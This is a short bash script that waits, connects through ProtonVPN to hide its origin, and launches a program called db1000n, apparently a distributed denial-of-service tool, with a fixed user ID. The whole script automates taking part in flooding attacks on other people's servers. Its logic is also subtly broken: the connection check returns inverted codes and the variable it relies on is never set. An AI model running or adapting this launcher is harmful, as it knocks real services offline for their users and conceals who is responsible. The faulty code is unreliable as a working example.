#!/usr/bin/env bash

checkInetConnection() {
  wget -q --spider https://google.com

  if [ $? -eq 0 ]; then
      return 1;
  fi

  return 0;
}

# Wait for internet connection
#isInternet=false
#while [ $isInternet == false ]; do
#  isInternet=checkInetConnection;
#  sleep 5
#done

sleep 360;

if [ $isInternet ]; then
  echo "Connected to internet";
  chmod +x ~/db1000n/db1000n
  protonvpn-cli c -f          #Connect to fastest server to your location
  #protonvpn-cli c --cc JP    #Connect to fastest server in country JP - Japan
  ~/db1000n/db1000n --user-id=302116940
fi